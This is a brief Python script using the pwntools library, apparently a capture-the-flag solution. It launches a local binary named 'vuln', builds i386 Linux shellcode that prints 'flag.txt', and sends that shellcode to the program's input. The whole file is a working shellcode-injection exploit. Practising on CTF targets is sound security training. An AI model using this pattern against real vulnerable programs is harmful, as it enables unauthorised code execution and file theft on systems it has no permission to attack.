from pwn import *

p = process('./vuln')

s = shellcraft.i386.linux.cat("flag.txt")
print(asm(s))
p.sendline(asm(s))
print(p.recvall())
